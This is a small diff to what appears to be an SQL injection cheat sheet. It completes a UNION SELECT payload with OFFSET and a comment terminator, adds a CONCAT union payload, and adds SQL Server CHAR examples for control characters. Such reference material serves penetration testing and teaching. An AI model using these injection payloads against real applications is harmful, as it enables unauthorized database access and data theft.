@@ -30,5 +30,16 @@
 ```
 - Using OFFSET:
 ```
-1' union select 1,column2,column3 from table_na
+1' union select 1,column2,column3 from table_name OFFSET 3; -- - 
+```
+- Using CONCAT to add two strings together
+```
+1' union select concat("hello", "world")
+```
+- Using the CHAR function to convert ASCII values to character values
+```
+PRINT 'a' + CHAR(9)  + 'b' -- horizontal tab 
+PRINT 'a' + CHAR(10) + 'b' -- line feed 
+PRINT 'a' + CHAR(11) + 'b' -- vertical tab 
+PRINT 'a' + CHAR(13) + 'b' -- carriage return
 ```
